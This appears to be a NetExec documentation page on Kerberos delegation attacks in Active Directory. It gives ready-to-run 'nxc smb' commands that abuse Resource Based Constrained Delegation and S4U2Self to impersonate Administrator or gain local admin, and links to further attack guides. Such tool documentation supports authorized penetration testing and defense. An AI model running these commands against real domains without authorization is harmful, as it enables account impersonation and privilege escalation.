---
description: Resource Based Constrained Delegation (RBCD) and
---

# 🆕 Delegation

## RBCD

If you have an object with the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute set to an account you control you can use the impersonate flag inside NetExec to automatically execute the Resource Based Constrained Delegation and impersonate any user:

```bash
nxc smb $TARGET -u $USER -p $PASSWORD --delegate Administrator
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p>RBCD with NetExec</p></figcaption></figure>

## S4U2Self

If you have a computer account you can (nearly) always get local administrator with the s4u2self extension:

```bash
nxc smb $TARGET -u $USER -H $NT_HASH --delegate Administrator --self
```

<figure><img src="../../.gitbook/assets/self (2).png" alt=""><figcaption><p>S4U2Self abuse using NetExecs delegation feature</p></figcaption></figure>



## Resources:

{% embed url="https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd" %}

{% embed url="https://www.thehacker.recipes/a-d/movement/kerberos/delegations/s4u2self-abuse" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" %}
